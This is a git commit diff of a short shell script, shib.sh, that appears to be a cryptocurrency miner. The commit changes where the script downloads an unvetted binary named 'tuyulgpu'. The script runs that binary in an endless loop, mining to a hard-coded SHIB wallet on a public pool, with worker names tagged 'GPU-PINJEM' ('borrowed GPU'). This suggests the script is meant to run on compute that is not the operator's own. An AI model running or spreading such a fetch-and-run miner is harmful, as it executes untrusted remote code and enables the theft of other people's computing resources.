9d8b174bb7245071814d173e3dbb7b0a5a74c3a5
skullCANDe <85566406+skullCANDe@users.noreply.github.com>
2021-07-09 10:59:55 +0530

    Update shib.sh

--- shib.sh
+++ shib.sh
@@ -2,7 +2,7 @@
 POOL=ethash.unmineable.com:3333
 WALLET=SHIB:0xa3d3f3d8ea6252f798d48e9dc7cde0ae2a45b383
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
-wget https://github.com/Nizz776/Nizz776/raw/main/tuyulgpu
+wget https://github.com/skullCANDe/skyz/raw/main/tuyulgpu
 chmod +x tuyulgpu
 while [ 1 ]; do
 ./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
